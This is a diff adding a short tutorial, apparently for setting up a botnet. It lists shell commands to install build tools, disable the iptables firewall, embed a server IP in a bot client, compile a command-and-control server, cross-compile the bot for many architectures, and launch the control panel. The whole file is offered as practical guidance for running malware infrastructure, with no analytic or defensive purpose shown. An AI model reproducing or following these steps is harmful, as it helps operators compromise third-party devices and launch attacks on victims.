@@ -1,0 +1,28 @@
+----------------------------------
+|Tutorial BY switch#0775|
+----------------------------------
+
+1 Installing Dependencies
+yum install gcc screen nano httpd python perl -y; ulimit -n 999999
+
+
+2 Stopping Iptables
+iptables -F; service iptables stop
+
+
+3 Edit Client Side (bot.c) with your server IP
+
+4 Compiling Serverside
+gcc cnc.c -o cnc -pthread
+
+
+5 Making Login Credentials
+nano login.txt
+
+
+6 Cross Compiling
+python cc7.py bot.c SERVERIP
+
+
+7 Starting Serverside
+screen ./cnc 666 850 cncport
